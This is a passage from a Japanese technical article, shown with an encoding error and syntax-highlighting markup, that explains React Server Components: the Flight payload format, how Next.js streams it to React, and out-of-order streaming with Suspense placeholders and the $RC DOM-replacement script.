      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Suspense</span></span> <span class="token attr-name">fallback</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">DelayedMessage</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Suspense</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®çŠ¶æ…‹ã§ãƒšãƒ¼ã‚¸ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€æœ€åˆã«ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ãŒè¡¨ç¤ºã•ã‚Œã€é…ã‚Œã¦ã„ã‚‹ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒ5ç§’å¾Œã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ã—ã‹ã—ã€ã“ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒã¾ã ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ã©ã†ã™ã‚Œã°ã‚µãƒ¼ãƒãƒ¼ä¸Šã§<code class="language-text">Suspense</code>ã‚’ä½¿ãˆã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚ä½¿ãˆã¾ã›ã‚“ã€‚é–¢æ•°ã‹ã‚‰è¿”ã•ã‚ŒãŸPayloadã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§å‡¦ç†ã™ã‚‹ã¨ã€å¢ƒç•Œã‚’å«ã‚€ä»®æƒ³DOMãŒæ§‹ç¯‰ã•ã‚Œã¾ã™ã€‚</p>
<p>Payloadã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
   <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Reference"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"fallback"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
       <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"Loading..."</span>
       <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
      <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ï¼ˆpropsï¼‰ã¨ã€PromiseãŒè§£æ±ºã—ãŸå¾Œã§èª­ã¿è¾¼ã¾ã‚Œã‚‹ã‚‚ã®ï¼ˆã€Œé…å»¶ãƒãƒ¼ãƒ‰ï¼ˆLazy nodeï¼‰ã€ã€ã“ã®å ´åˆã¯<code class="language-text">DelayedMessage</code>ï¼‰ãŒã„ãšã‚Œã‚‚å«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚</p>
<p>Payloadã¯ã€ãƒãƒ£ãƒ³ã‚¯åŒ–ã—ã¦ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã™ã‚‹ã¨ã¨ã‚‚ã«ã€PromiseãŒå¾Œã§è§£æ±ºã•ã‚Œã‚‹ä»®æƒ³DOMã®å ´æ‰€ã‚’å‚ç…§ã—ã¾ã™ã€‚ãã†ã™ã‚‹ã“ã¨ã§ã€Reactã¨ã€RSCã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€æœ€çŸ­æ™‚é–“ã§UIã‚’è¡¨ç¤ºã—ã€å®Ÿéš›ã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä½“æ„Ÿãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã®ã„ãšã‚Œã‚‚æ”¹å–„ã—ã‚ˆã†ã¨ã—ã¦ã„ã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã•ã‚ŒãŸFlightãƒ‡ãƒ¼ã‚¿ã¯ã©ã“ã«é€ã‚‰ã‚Œã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚Reactã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹å†…ã®ã©ã“ã‹ã§ã‚ã‚‹ã¯ãšã§ã™ã€‚</p>
<h2>Reactã«Payloadã‚’æ¸¡ã™</h2>
<p>RSCã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ãŸã‚ã«ã€Reactã¯Flightå½¢å¼ï¼ˆæ–‡å­—åˆ—ï¼‰ã‚’å—ã‘å–ã‚Šã€<code class="language-text">parseModelString</code>ãªã©ã®é–¢æ•°ã§Reactè¦ç´ ã«å¤‰æ›ã™ã‚‹æ©Ÿèƒ½ã‚’ã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹ã«è¿½åŠ ã—ã¾ã—ãŸã€‚</p>
<p>é©åˆ‡ãªãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã—ã€ã“ã‚Œã‚‰ã®React APIã‚’å®Ÿè¡Œã™ã‚‹ã‹ã©ã†ã‹ã¯RSCã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯æ¬¡ç¬¬ã§ã™ã€‚</p>
<p>ä¾‹ãˆã°ã€Next.jsã®å ´åˆã¯ã€ã‚¢ãƒ—ãƒªã«ãƒ©ãƒƒãƒ”ãƒ³ã‚°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’è¿½åŠ ã—ã€ãã“ã«Payloadãƒ‡ãƒ¼ã‚¿ã‚’ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã«ã‚ˆã‚Šé€ä¿¡ã—ã¾ã™ã€‚</p>
<p>ã“ã‚Œã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ServerRoot</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">AppRouter</span></span>
      <span class="token attr-name">actionQueue</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>actionQueue<span class="token punctuation">}</span></span>
      <span class="token attr-name">globalErrorComponentAndStyles</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>initialRSCPayload<span class="token punctuation">.</span><span class="token constant">G</span><span class="token punctuation">}</span></span>
      <span class="token attr-name">assetPrefix</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>initialRSCPayload<span class="token punctuation">.</span>p<span class="token punctuation">}</span></span>
  <span class="token punctuation">/></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">ServerRoot</span></span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Next.jsã¯ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãƒ„ãƒªãƒ¼ã®<code class="language-text">AppRouter</code>ã®ä¸Šã«ã€<code class="language-text">ServerRoot</code>ã¨ã„ã†ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’è¿½åŠ ã—ã¾ã™ã€‚ãã“ã‹ã‚‰<code class="language-text">AppRouter</code>ã«RSC Payloadãƒ‡ãƒ¼ã‚¿ã‚’ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã—ã¾ã™ã€‚</p>
<p>ãã®ãƒ‡ãƒ¼ã‚¿ã¯ã€æœ€çµ‚çš„ã«Reactã®Promiseãƒ™ãƒ¼ã‚¹ã®APIï¼ˆFlightå½¢å¼ã‚’å—ã‘å–ã‚‹ãŸã‚ã®APIï¼‰ã«ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚</p>
<p>ã“ã®ã‚ˆã†ã«ã€Reactã¯Payloadã‚’ã‚‚ã¨ã«ä»®æƒ³DOMã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã®APIã‚’æä¾›ã—ã€Next.jsï¼ˆã¾ãŸã¯RSCã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ï¼‰ã«ã¯ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒå®Ÿè¡Œã•ã‚ŒãŸå¾Œã€ãã®ãƒ‡ãƒ¼ã‚¿ã‚’Reactã«æ¸¡ã™ç‹¬è‡ªã®ä»•çµ„ã¿ãŒå‚™ã‚ã£ã¦ã„ã¾ã™ã€‚</p>
<h2>é †ä¸åŒã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°</h2>
<p>ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã«ã¤ã„ã¦è©±ã™ã¹ãç‚¹ã¯ä»–ã«ã‚‚ã‚ã‚Šã¾ã™ã€‚ç•°ãªã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®å®Ÿè¡ŒãŒç•°ãªã‚‹ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã§å®Œäº†ã™ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ãƒãƒ£ãƒ³ã‚¯åŒ–ã•ã‚ŒãŸPayloadãŒã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã•ã‚Œã¦ããŸã¨ãã€Reactã¯ä»®æƒ³DOMï¼ˆãŠã‚ˆã³DOMï¼‰ã®ã©ã“ã«ãƒ‡ãƒ¼ã‚¿ã‚’ç½®ãã¹ãã‹ã‚’ã©ã®ã‚ˆã†ã«ã—ã¦åˆ¤æ–­ã—ã¦ã„ã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚</p>
<p><code class="language-text">DelayedMessage</code>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ä½¿ç”¨ã—ãŸDOMã‚’å†ã³è¦‹ã¦ã¿ã‚‹ã¨ã€æœ€åˆã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>understandingreact.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!--$?--></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>B:0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Loading...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!--/$--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Reactã¯ã€ç‰¹æ®ŠãªIDãŒè¨­å®šã•ã‚ŒãŸ<code class="language-text">template</code>ã®ã‚ˆã†ãªãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ãƒ¼ã¨ã€<code class="language-text">Suspense</code>ãŒå¾…ã£ã¦ã„ã‚‹PromiseãŒè§£æ±ºã—ãŸæ™‚ç‚¹ã§ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®æŒ¿å…¥å…ˆã‚’è¨˜è¼‰ã—ãŸHTMLã‚³ãƒ¡ãƒ³ãƒˆã‚’æ®‹ã—ã¾ã™ã€‚</p>
<p>ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã¯DOMã®ä¸­ã«ã‚ã‚Šã¾ã™ãŒã€PromiseãŒè§£æ±ºã™ã‚‹ã¨æ–°ã—ã„JavaScriptãŒãƒšãƒ¼ã‚¸ã«ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã•ã‚Œã¦ãã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token function-variable function">$RC</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  c <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
  c<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      b <span class="token operator">=</span> a<span class="token punctuation">.</span>previousSibling<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span>
          b<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token string">"$!"</span><span class="token punctuation">,</span>
          a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"data-dgst"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
          e <span class="token operator">=</span> b<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span>
          a <span class="token operator">=</span> b<span class="token punctuation">.</span>nextSibling<span class="token punctuation">;</span>
          <span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">do</span> <span class="token punctuation">{</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> <span class="token number">8</span> <span class="token operator">===</span> a<span class="token punctuation">.</span>nodeType<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                  <span class="token keyword">var</span> d <span class="token operator">=</span> a<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"/$"</span> <span class="token operator">===</span> d<span class="token punctuation">)</span>
                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> f<span class="token punctuation">)</span>
                          <span class="token keyword">break</span><span class="token punctuation">;</span>
                      <span class="token keyword">else</span>
                          f<span class="token operator">--</span><span class="token punctuation">;</span>
                  <span class="token keyword">else</span>
                      <span class="token string">"$"</span> <span class="token operator">!==</span> d <span class="token operator">&amp;&amp;</span> <span class="token string">"$?"</span> <span class="token operator">!==</span> d <span class="token operator">&amp;&amp;</span> <span class="token string">"$!"</span> <span class="token operator">!==</span> d <span class="token operator">||</span> f<span class="token operator">++</span>
              <span class="token punctuation">}</span>
              d <span class="token operator">=</span> a<span class="token punctuation">.</span>nextSibling<span class="token punctuation">;</span>
              e<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
              a <span class="token operator">=</span> d
          <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> c<span class="token punctuation">.</span>firstChild<span class="token punctuation">;</span> <span class="token punctuation">)</span>
              e<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>firstChild<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          b<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token string">"$"</span>
      <span class="token punctuation">}</span>
      b<span class="token punctuation">.</span>_reactRetry <span class="token operator">&amp;&amp;</span> b<span class="token punctuation">.</span><span class="token function">_reactRetry</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token punctuation">;</span>
$<span class="token constant">RC</span><span class="token punctuation">(</span><span class="token string">"B:0"</span><span class="token punctuation">,</span> <span class="token string">"S:0"</span><span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€Promiseã®è§£æ±ºå¾Œã«æ–°ãŸã«ä½œæˆã•ã‚ŒãŸDOMã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ã€ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ãƒ¼ãŒæ®‹ã•ã‚Œã¦ã„ãŸé©åˆ‡ãªå ´æ‰€ã«æŒ¿å…¥ã—ã€ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ãƒ¼ã¨ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã‚’å‰Šé™¤ã—ã¾ã™ã€‚</p>
<p>ã“ã®DOMæ“ä½œã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚ŒãŸå¾Œã€DOMã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsxx"><pre style="counter-reset: linenumber NaN" class="language-jsxx line-numbers"><code class="language-jsxx">&lt;main&gt;
  &lt;h1&gt;understandingreact.com&lt;/h1&gt;
  &lt;!--$--&gt;
  &lt;p&gt;This message was loaded after a 5 second delay!&lt;/p&gt;
  &lt;!--/$--&gt;
&lt;/main&gt;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã‚Œã‚’é †ä¸åŒã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã¨ã„ã„ã¾ã™ã€‚ã“ã‚Œã¯å˜ã«ã€ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã•ã‚Œã¦ããŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ã€å…ˆã«å®Œäº†ã™ã‚‹ä»–ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚ˆã‚Šå‰ã®å ´æ‰€ã§ã‚ã£ã¦ã‚‚ã€ä»®æƒ³DOMï¼DOMãƒ„ãƒªãƒ¼ã®æ‰€å®šã®å ´æ‰€ã«æŒ¿å…¥ã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚</p>
<p>ãã†ã™ã‚‹ã“ã¨ã§ã€ç‰¹å®šã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®å®Ÿè¡Œã«æ™‚é–“ãŒã‹ã‹ã£ãŸã¨ã—ã¦ã‚‚ã€ãã®å®Œäº†ã‚’å¾…ãŸãšã«UIã‚’æ›´æ–°ã—ã€ä»–ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®çµæœã‚’åæ˜ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ã“ã“ã¾ã§ã¯Server Components ã«ã¤ã„ã¦ã—ã‹è¦‹ã¦ã„ã¾ã›ã‚“ã€‚ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ãŒä½•å¹´ã‚‚å‰ã‹ã‚‰æ›¸ã„ã¦ããŸã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã¤ã„ã¦ã¯ã©ã†ã§ã—ã‚‡ã†ã‹ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹é–¢æ•°ã§ã‚ã‚‹Client Componentsã¯ã©ã†ã§ã—ã‚‡ã†ã‹ã€‚</p>
<p>ãã‚Œã«ã¤ã„ã¦èªã‚‹ã†ãˆã§æ¬ ã‹ã›ãªã„ã®ãŒã€RSCã‚’æ”¯ãˆã‚‹ç¸ã®ä¸‹ã®åŠ›æŒã¡ã¨ã‚‚è¨€ãˆã‚‹ãƒãƒ³ãƒ‰ãƒ©ã§ã™ã€‚</p>
<h2>ãƒãƒ³ãƒ‰ãƒ©ã¨ã‚¤ãƒ³ã‚¿ãƒ¼ãƒªãƒ¼ãƒ“ãƒ³ã‚°</h2>
<p>æ˜”ã‹ã‚‰ã€Reactã®åŸºæœ¬çš„ãªè€ƒãˆæ–¹ã®ä¸€ã¤ã¨ã—ã¦ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚³ãƒ³ãƒã‚¸ã‚·ãƒ§ãƒ³ãŒæŒ™ã’ã‚‰ã‚Œã¦ã„ã¾ã—ãŸã€‚DOMã®æ§‹é€ ã‚’æ±ºã‚ã‚‹ä½œæ¥­ã¯ã•ã¾ã–ã¾ãªé–¢æ•°ã«åˆ†ã‘ã¦è¡Œã„ã€å„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’è¦ªå­é–¢ä¿‚ã«ã‚ˆã£ã¦çµ„ã¿åˆã‚ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>RSCãŒã“ã®åŸºæœ¬çš„ãªè€ƒãˆæ–¹ã‹ã‚‰å¤§ããé›¢ã‚Œãªã„ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã«ã¯ã€Server Componentsã¨Client Componentsã‚’ã‚¤ãƒ³ã‚¿ãƒ¼ãƒªãƒ¼ãƒ–ï¼ˆæ··åœ¨ã•ã›ã‚‹ï¼‰ã§ããªãã¦ã¯ã„ã‘ã¾ã›ã‚“ã€‚<strong>Client Componentsã¯ã€Server Componentsã®å­ã«ãªã‚Œã‚‹å¿…è¦</strong>ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã¯ã€propsï¼ˆé–¢æ•°ã®å¼•æ•°ï¼‰ã‚’æ¸¡ã›ã‚‹ã“ã¨ã‚‚å«ã¿ã¾ã™ã€‚</p>
<p>å®Ÿéš›ã“ã‚ŒãŒä½•ã‚’æ„å‘³ã™ã‚‹ã‹ã¨ã„ã†ã¨ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆéšå±¤ã®ä¸­ã«ã¯ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹é–¢æ•°ã¨ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹é–¢æ•°ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚ã—ã‹ã—æœ€çµ‚çš„ã«ã¯ã€ã©ã®é–¢æ•°ã‚‚è‡ªã‚‰ãŒç”Ÿæˆã™ã‚‹DOMã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®æ§‹é€ ã¨ä¸­èº«ã‚’è¨ˆç®—ã—ã¾ã™ã€‚</p>
